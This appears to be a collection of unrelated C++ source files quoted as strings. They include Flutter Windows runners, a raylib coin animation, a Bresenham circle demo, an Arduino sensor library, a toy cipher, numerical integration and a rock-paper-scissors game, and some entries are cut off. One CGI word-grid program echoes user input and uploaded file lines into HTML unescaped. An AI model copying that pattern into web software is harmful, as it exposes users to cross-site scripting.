    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"watery\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Header_files/coins.hpp\"\n\n\nCOIN::COIN()\n{\n    //Every coin status wheather it is collected or not\n    for (int i = 0; i < 49; ++i)\n    {\n        coinCollected[i] = false;\n    }\n    \n    //Loading coin Image\n    Coin_image = LoadImageAnim(\"Pictures/coin.gif\", &animFrames);\n\n    //Loading image to texture for display\n    for (int i = 0; i < 50; i++)\n        Coin_Texture[i] = LoadTextureFromImage(Coin_image);\n\n    //Initializing the position of coins\n    coins_positions[0].x = 150;\n    coins_positions[0].y = 880;\n\n    coins_positions[1].x = 300;\n    coins_positions[1].y = 800;\n\n    coins_positions[2].x = 400;\n    coins_positions[2].y = 890;\n\n    coins_positions[3].x = 550;\n    coins_positions[3].y = 800;\n\n    //coins on the enemy plates\n    coins_positions[4].x = 640;\n    coins_positions[4].y = 890;\n\n    coins_positions[5].x = 550;\n    coins_positions[5].y = 920;\n\n    //Coins after first enemy plate\n\n    coins_positions[6].x = 600;\n    coins_positions[6].y = 800;\n\n    coins_positions[7].x = 900;\n    coins_positions[7].y = 800;\n\n    coins_positions[8].x = 1040;\n    coins_positions[8].y = 800;\n\n    coins_positions[9].x = 1000;\n    coins_positions[9].y = 750;\n\n    coins_positions[10].x = 1050;\n    coins_positions[10].y = 650;\n\n    coins_positions[11].x = 900;\n    coins_positions[11].y = 500;\n\n    coins_positions[12].x = 700;\n    coins_positions[12].y = 500;\n\n    coins_positions[13].x = 500;\n    coins_positions[13].y = 600;\n\n    coins_positions[14].x = 700;\n    coins_positions[14].y = 700;\n\n    coins_positions[15].x = 650;\n    coins_positions[15].y = 650;\n\n    coins_positions[16].x = 450;\n    coins_positions[16].y = 580;\n\n    coins_positions[17].x = 350;\n    coins_positions[17].y = 580;\n\n    coins_positions[18].x = 250;\n    coins_positions[18].y = 580;\n\n    coins_positions[19].x = 150;\n    coins_positions[19].y = 580;\n\n    coins_positions[20].x = 50;\n    coins_positions[20].y = 400;\n\n    coins_positions[21].x = 70;\n    coins_positions[21].y = 300;\n\n    coins_positions[22].x = 90;\n    coins_positions[22].y = 200;\n\n    coins_positions[23].x = 150;\n    coins_positions[23].y = 100;\n\n    coins_positions[24].x = 250;\n    coins_positions[24].y = 120;\n\n    coins_positions[25].x = 350;\n    coins_positions[25].y = 120;\n\n    coins_positions[26].x = 450;\n    coins_positions[26].y = 180;\n\n    coins_positions[27].x = 570;\n    coins_positions[27].y = 300;\n\n    coins_positions[28].x = 670;\n    coins_positions[28].y = 250;\n\n    coins_positions[29].x = 770;\n    coins_positions[29].y = 150;\n\n    coins_positions[30].x = 850;\n    coins_positions[30].y = 220;\n\n    coins_positions[31].x = 950;\n    coins_positions[31].y = 120;\n\n    coins_positions[32].x = 1050;\n    coins_positions[32].y = 120;\n\n    coins_positions[33].x = 1250;\n    coins_positions[33].y = 220;\n\n    coins_positions[34].x = 1450;\n    coins_positions[34].y = 320;\n\n    coins_positions[35].x = 1650;\n    coins_positions[35].y = 350;\n\n    coins_positions[36].x = 1750;\n    coins_positions[36].y = 550;\n\n    coins_positions[37].x = 1850;\n    coins_positions[37].y = 550;\n\n    coins_positions[38].x = 1950;\n    coins_positions[38].y = 550;\n\n    coins_positions[39].x = 1550;\n    coins_positions[39].y = 550;\n\n    coins_positions[40].x = 1650;\n    coins_positions[40].y = 550;\n\n    coins_positions[41].x = 1300;\n    coins_positions[41].y = 480;\n\n    coins_positions[42].x = 1400;\n    coins_positions[42].y = 480;\n\n    coins_positions[43].x = 1650;\n    coins_positions[43].y = 880;\n\n    coins_positions[44].x = 1750;\n    coins_positions[44].y = 880;\n\n    coins_positions[45].x = 1850;\n    coins_positions[45].y = 880;\n\n    coins_positions[46].x = 1550;\n    coins_positions[46].y = 880;\n\n    nextFrameDataOffset = 0;\n    currentAnimFrame = 0;\n    frameDelay = 50;\n    frameCounter = 0;\n\n    //Making rectangle for each coin\n    for (int i = 0; i < 49; i++)\n    {\n        Coin_Rect[i] = { coins_positions[i].x,coins_positions[i].y,(float)Coin_image.width,(float)Coin_image.height };\n    }\n\n}\n\nCOIN::~COIN()\n{\n    //Unloading each taxture and image of coin to free the memory space\n    for (int i = 0; i < 49; i++)\n    {\n        UnloadTexture(Coin_Texture[i]);\n\n    }\n    UnloadImage(Coin_image);\n\n}\n\n//Drawing coins\nvoid COIN::Draw()\n{\n    //Coin will draw only if it is not collected\n    for (int i = 0; i < 49; ++i)\n    {\n        // Draw only if the coin has not been collected\n        if (!coinCollected[i]) {\n            DrawTextureV(Coin_Texture[i], coins_positions[i], GOLD);\n        }\n    }\n\n}\n\n//Use to update the frames of coins to look like rotating coin\nvoid COIN::Update()\n{\n    frameCounter++;\n    if (frameCounter >= frameDelay)\n    {\n        // Move to next frame\n        //If final frame is reached we return to first frame\n        currentAnimFrame++;\n        if (currentAnimFrame >= animFrames) currentAnimFrame = 0;\n\n\n        nextFrameDataOffset = Coin_image.width * Coin_image.height * 4 * currentAnimFrame;\n\n\n\n        for (int i = 0; i < 49; i++)\n        {\n            if (!coinCollected[i])\n   ",
    "/*Program 3 : Implement Bresenham\u2019s circle drawing algorithm to draw any object. The object should be displayed in all the quadrants with respect to center and radius*/\r\n\r\n#include<GL/glut.h>\r\n#include<iostream>\r\nusing namespace std;\r\nint r;\r\n\r\nvoid E_way(int x, int y){\r\nglBegin(GL_POINTS);\r\nglVertex2i(x+320,y+240);\r\nglVertex2i(y+320,x+240);\r\nglVertex2i(y+320, -x+240);\r\nglVertex2i(x+320, -y+240);\r\nglVertex2i(-x+320,-y+240);\r\nglVertex2i(-y+320,-x+240);\r\nglVertex2i(-y+320,x+240);\r\nglVertex2i(-x+320,y+240);\r\nglEnd();\r\nglFlush();\r\n}\r\nvoid B_circle(){\r\nfloat d;\r\nd = 3 - 2*r;\r\nint x,y;\r\nx = 0 ;\r\ny = r ;\r\ndo{\r\nE_way(x,y);\r\n\r\nif(d<0){\r\nd=d+4*x+6;\r\n}\r\nelse{\r\nd= d+4*(x-y)+10;\r\ny=y-1;\r\n}\r\nx=x+1;\r\n}\r\nwhile(x<y);\r\n}\r\nvoid init(){\r\nglClearColor(1,1,1,0);\r\nglColor3f(1,0,0);\r\ngluOrtho2D(0,640,0,480);\r\nglClear(GL_COLOR_BUFFER_BIT);\r\n}\r\nint main(int argc, char **argv){\r\ncout<<\"\\n Enter Radius \\t \";\r\ncin>>r;\r\n\r\nglutInit(&argc, argv);\r\nglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\nglutInitWindowPosition(100,100);\r\nglutInitWindowSize(640,480);\r\nglutCreateWindow(\"Bresenham's Circle\");\r\ninit();\r\nglutDisplayFunc(B_circle);\r\nglutMainLoop();\r\nreturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_videos_verticales\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"QTRSensors.h\"\n#include <Arduino.h>\n\nvoid QTRSensors::setTypeRC()\n{\n  _type = QTRType::RC;\n  _maxValue = _timeout;\n}\n\nvoid QTRSensors::setTypeAnalog()\n{\n  _type = QTRType::Analog;\n  _maxValue = 1023; // Arduino analogRead() returns a 10-bit value by default\n}\n\nvoid QTRSensors::setSensorPins(const uint8_t * pins, uint8_t sensorCount)\n{\n  if (sensorCount > QTRMaxSensors) { sensorCount = QTRMaxSensors; }\n\n  // (Re)allocate and initialize the array if necessary.\n  uint8_t * oldSensorPins = _sensorPins;\n  _sensorPins = (uint8_t *)realloc(_sensorPins, sizeof(uint8_t) * sensorCount);\n  if (_sensorPins == nullptr)\n  {\n    // Memory allocation failed; don't continue.\n    free(oldSensorPins); // deallocate any memory used by old array\n    return;\n  }\n\n  for (uint8_t i = 0; i < sensorCount; i++)\n  {\n    _sensorPins[i] = pins[i];\n  }\n\n  _sensorCount = sensorCount;\n\n  // Any previous calibration values are no longer valid, and the calibration\n  // arrays might need to be reallocated if the sensor count was changed.\n  calibrationOn.initialized = false;\n  calibrationOff.initialized = false;\n}\n\nvoid QTRSensors::setTimeout(uint16_t timeout)\n{\n  if (timeout > 32767) { timeout = 32767; }\n  _timeout = timeout;\n  if (_type == QTRType::RC) { _maxValue = timeout; }\n}\n\nvoid QTRSensors::setSamplesPerSensor(uint8_t samples)\n{\n  if (samples > 64) { samples = 64; }\n  _samplesPerSensor = samples;\n}\n\nvoid QTRSensors::setEmitterPin(uint8_t emitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = emitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n\n  _emitterPinCount = 1;\n}\n\nvoid QTRSensors::setEmitterPins(uint8_t oddEmitterPin, uint8_t evenEmitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = oddEmitterPin;\n  _evenEmitterPin = evenEmitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n  pinMode(_evenEmitterPin, OUTPUT);\n\n  _emitterPinCount = 2;\n}\n\nvoid QTRSensors::releaseEmitterPins()\n{\n  if (_oddEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_oddEmitterPin, INPUT);\n    _oddEmitterPin = QTRNoEmitterPin;\n  }\n\n  if (_evenEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_evenEmitterPin, INPUT);\n    _evenEmitterPin = QTRNoEmitterPin;\n  }\n\n  _emitterPinCount = 0;\n}\n\nvoid QTRSensors::setDimmingLevel(uint8_t dimmingLevel)\n{\n  if (dimmingLevel > 31) { dimmingLevel = 31; }\n  _dimmingLevel = dimmingLevel;\n}\n\n// emitters defaults to QTREmitters::All; wait defaults to true\nvoid QTRSensors::emittersOff(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_oddEmitterPin) == HIGH))\n    {\n      digitalWrite(_oddEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_evenEmitterPin) == HIGH))\n    {\n      digitalWrite(_evenEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  if (wait && pinChanged)\n  {\n    if (_dimmable)\n    {\n      // driver min is 1 ms\n      delayMicroseconds(1200);\n    }\n    else\n    {\n      delayMicroseconds(200);\n    }\n  }\n}\n\nvoid QTRSensors::emittersOn(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n  uint16_t emittersOnStart;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        ( _dimmable || (digitalRead(_oddEmitterPin) == LOW)))\n    {\n      emittersOnStart = emittersOnWithPin(_oddEmitterPin);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (_dimm",
    "\ufeff#include \"chiper.h\"\n\nconst auto chiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* enteredMessage = new std::string( \"\" );\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"Enter your message: \";\n\tgetline( std::cin, *enteredMessage );\n\n\tconst std::size_t* const enteredMessageSize = new std::size_t( enteredMessage->length() );\n\n\tfor (std::size_t i = 0; i < *enteredMessageSize; i++) {\n\t\tint* symbol = new int( (*enteredMessage)[i] );\n\n\t\t*chiperedMessage += std::to_string( *symbol );\n\n\t\tif (!(i == *enteredMessageSize - 1)) chiperedMessage->push_back( '_' );\n\n\t\tdelete symbol;\n\t}\n\n\tdelete enteredMessageSize;\n\n\tstd::cout << \"Chipered message: \" << *chiperedMessage << std::endl;\n\n\tdelete enteredMessage;\n\tdelete chiperedMessage;\n\n\t_getch();\n};\n\nconst auto unchiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\tstd::string* unchiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"IF YOU DON'T KNOW A CHIPER IT WILL BE A ERROR!!!\" << std::endl;\n\tstd::cout << \"Enter your chipered message: \";\n\tgetline( std::cin, *chiperedMessage );\n\n\tstd::string* delimiter = new std::string(\"_\");\n\tstd::size_t* pos = new std::size_t(0);\n\n\tstd::string* token = new std::string(\"\");\n\n\tstd::vector<std::string>* symbols = new std::vector<std::string>({});\n\n\twhile ((*pos = chiperedMessage->find( *delimiter )) != std::string::npos) {\n\t\t*token = chiperedMessage->substr( 0, *pos );\n\n\t\tsymbols->push_back( *token );\n\n\t\tchiperedMessage->erase( 0, *pos + delimiter->length() );\n\t}\n\n\tsymbols->push_back( *chiperedMessage );\n\n\tdelete delimiter;\n\tdelete pos;\n\tdelete token;\n\n\tfor (std::size_t i = 0; i < symbols->size(); i++) {\n\t\tunchiperedMessage->push_back(static_cast<char>(std::stoi((*symbols)[i])));\n\t}\n\n\tdelete symbols;\n\n\tstd::cout << \"Unchipered message: \" << *unchiperedMessage << std::endl;\n\n\tdelete chiperedMessage;\n\tdelete unchiperedMessage;\n\n\t_getch();\n};\n\n\nint main() {\n\t\n\tstd::cout << \"[c]hiper or [u]nchiper message: \";\n\tint* command = new int(_getch());\n\t\n\tif (static_cast<char>(*command) == 'c') chiperMessage(); \n\tif (static_cast<char>(*command) == 'u') unchiperMessage();\n\tif (!(static_cast<char>(*command) == 'c') && !(static_cast<char>(*command) == 'u')) exit( 505 );\n\n\tdelete command;\n\t\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <sstream>\n#include <ctime> // For randomization\n#include <cgicc/Cgicc.h>\n#include <cgicc/HTTPHTMLHeader.h>\n#include <cgicc/FormEntry.h>\n#include <cgicc/HTTPStatusHeader.h>\n\nusing namespace cgicc;\nstd::string trim(const std::string& str) {\n    size_t start = str.find_first_not_of(\" \\t\\n\\r\");\n    size_t end = str.find_last_not_of(\" \\t\\n\\r\");\n    return (start == std::string::npos || end == std::string::npos) ? \"\" : str.substr(start, end - start + 1);\n}\n\nstd::vector<std::string> generateRandomGrid(int rows, int cols) {\n    std::vector<std::string> grid(rows);\n    std::srand(std::time(0)); // Seed for random generation\n\n    for (int i = 0; i < rows; ++i) {\n        std::string row;\n        for (int j = 0; j < cols; ++j) {\n            char randomLetter = 'A' + (std::rand() % 26); // Random letter from A-Z\n            row += randomLetter;\n        }\n        grid[i] = row;\n    }\n\n    return grid;\n}\n\nint countWordInGrid(const std::vector<std::string>& grid, const std::string& word) {\n    int count = 0;\n    std::string upperWord = word;\n    std::transform(upperWord.begin(), upperWord.end(), upperWord.begin(), ::toupper);\n\n    for (const auto& row : grid) {\n        std::string upperRow = row;\n        std::transform(upperRow.begin(), upperRow.end(), upperRow.begin(), ::toupper);\n        for (size_t i = 0; i <= upperRow.length() - upperWord.length(); i++) {\n            if (upperRow.substr(i, upperWord.length()) == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    for (size_t col = 0; col < grid[0].length(); col++) {\n        for (size_t row = 0; row <= grid.size() - upperWord.length(); row++) {\n            std::string verticalSegment;\n            for (size_t k = 0; k < upperWord.length(); k++) {\n                verticalSegment += grid[row + k][col];\n            }\n            std::transform(verticalSegment.begin(), verticalSegment.end(), verticalSegment.begin(), ::toupper);\n            if (verticalSegment == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    try {\n        Cgicc cgi;\n        std::cout << HTTPHTMLHeader() << std::endl;\n\n        std::string gridType = cgi(\"gridType\");\n        std::string searchWord = trim(cgi(\"searchWord\"));\n\n        std::vector<std::string> grid;\n\n        if (gridType == \"generate\") {\n            int rows = std::stoi(cgi(\"rows\"));\n            int cols = std::stoi(cgi(\"columns\"));\n\n            grid = generateRandomGrid(rows, cols);\n        } else {\n            const_file_iterator file = cgi.getFile(\"gridFile\");\n            if (file != cgi.getFiles().end()) {\n                std::istringstream stream((*file).getData());\n                std::string line;\n                while (std::getline(stream, line)) {\n                    if (!line.empty()) {\n                        grid.push_back(line);\n                    }\n                }\n            }\n        }\n\n        int wordCount = countWordInGrid(grid, searchWord);\n\n        std::cout << \"<html lang=\\\"en\\\">\\n\";\n        std::cout << \"<head>\\n\";\n        std::cout << \"<title>Pattern Match Game Result</title>\\n\";\n        std::cout << \"<style>\\n\";\n        std::cout << \"body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; text-align: center; }\\n\";\n        std::cout << \".container { max-width: 600px; margin: 20px auto; padding: 20px; background-color white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }\\n\";\n        std::cout << \".content { padding: 20px; text-align: center; }\\n\";\n        std::cout << \"pre { background: #f0f0f0; border: 1px solid #ddd; padding: 10px; border-radius: 5px; font-size: 1.25em; }\\n\"; \n        std::cout << \"</style>\\n\";\n        std::cout << \"</head>\\n\";\n        std::cout << \"<body>\\n\";\n        std::cout << \"<div class='container'>\\n\";\n        std::cout << \"<h1>Pattern Match Game Result</h1>\\n\";\n        std::cout << \"<div class='content'>\\n\";\n        std::cout << \"<pre>\\n\";\n        for (const auto& row : grid) {\n            std::cout << row << \"\\n\";\n        }\n        std::cout << \"</pre>\\n\";\n        std::cout << \"<p>Occurrences of the word '\" << searchWord << \"': \" << wordCount << \"</p>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</body>\\n\";\n        std::cout << \"</html>\\n\";\n    } catch (const std::exception& e) {\n        std::cout << \"Content-Type: text/plain\\n\\n\";\n        std::cout << \"Error: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n\n// Midpoint method\nvoid midpoint(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n\n    std::cout << \"MidPoint result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n\n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 0; j < n; j++) {\n            double x_mid = a + (j + 0.5) * h; \n            sum += func(x_mid); \n        }\n        double integral = h * sum; \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral; \n\n        if (i > 0) {\n            double diff = prev_integral - integral; \n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Trapezoidal method\nvoid trapezoidal(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Trapezoidal result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            sum += func(x);\n        }\n        double integral = h * (0.5 * (func(a) + func(b)) + sum); \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Simpson's method\nvoid simpsons(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Simpson's result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum_even = 0.0;\n        double sum_odd = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            if (j % 2 == 0) {\n                sum_even += func(x);\n            } else {\n                sum_odd += func(x);\n            }\n        }\n        double integral = (h / 3.0) * (func(a) + func(b) + 4.0 * sum_odd + 2.0 * sum_even);\n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral ",
    "// Online C++ compiler to run C++ program online\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\n#define ROCK 1\n#define PAPER 2\n#define SCISSORS 3\n\nusing namespace std;\nint main()\n{\n    srand((unsigned int) time(NULL));\n    \n    int player_throw = 0;\n    int ai_throw = 0;\n    bool draw = false;\n    \n    do\n    {\n        cout << \"Select your throw.\" << endl;\n        cout << \"1) Rock\" << endl;\n        cout << \"2) Paper\" << endl;\n        cout << \"3) Scissors\" << endl;\n        cout << \"selection:\";\n        cin >> player_throw;\n        \n        cout << endl;\n        \n        ai_throw = (rand() % 3) +1;\n        if (ai_throw == ROCK)\n        {\n            cout << \"AI throws ROCK.\" << endl;\n        }\n        else if (ai_throw == PAPER)\n        {\n            cout << \"AI throws == PAPER.\" << endl;\n        }\n        else if (ai_throw == SCISSORS)\n        {\n            cout << \"AI throws SCISSORS.\" <<endl;\n        }\n        draw = false;\n        if (player_throw == ai_throw)\n        {\n            draw = true;\n            cout << \"Draw! Play again!\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == SCISSORS)\n        {\n            cout << \"ROCK beats SCISSORS! YOU WIN.\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == PAPER)\n        {\n            cout << \" PAPER beats ROCK! YOU LOSE.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == ROCK)\n        {\n            cout << \"PAPER beats ROCK! YOU WIN.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == SCISSORS)\n        {\n            cout << \"SCISSORS beats PAPER! YOU LOSE.\" <<endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == PAPER)\n        {\n            cout <<  \"SCISSORS beats PAPER! YOU WIN.\" << endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == ROCK)\n        {\n            cout << \"ROCK beats SCISSORS! YOU LOSE.\" << endl;\n        }\n        \n        cout << endl;\n        \n    \n  // rack beats scissor\n  // scissors beats paper\n  // paper beats rock\n  } while (draw);\n\n    return 0;\n}\n",
